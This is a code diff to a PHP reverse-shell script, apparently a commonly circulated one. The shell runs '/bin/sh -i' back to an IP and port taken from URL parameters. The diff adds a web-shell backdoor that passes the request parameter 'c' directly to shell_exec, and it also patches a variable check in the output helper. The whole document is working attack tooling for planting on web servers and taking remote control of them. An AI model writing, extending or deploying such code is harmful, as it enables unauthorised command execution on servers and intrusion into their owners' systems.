@@ -64,6 +64,11 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
+// Just run command
+if (isset($_REQUEST['c'])) {
+	die(shell_exec($_REQUEST['c']));
+}
+
 // Get IP and Port from URL parameters
 if (isset($_REQUEST['ip'])) $ip = $_REQUEST['ip'];
 if (isset($_REQUEST['port'])) $port = $_REQUEST['port'];
@@ -199,7 +204,7 @@ proc_close($process);
 // Like print, but does nothing if we've daemonised ourself
 // (I can't figure out how to redirect STDOUT like a proper daemon)
 function printit ($string) {
-	if (!$daemon) {
+	if (!isset($daemon) || !$daemon) {
 		print "$string\n";
 	}
 }
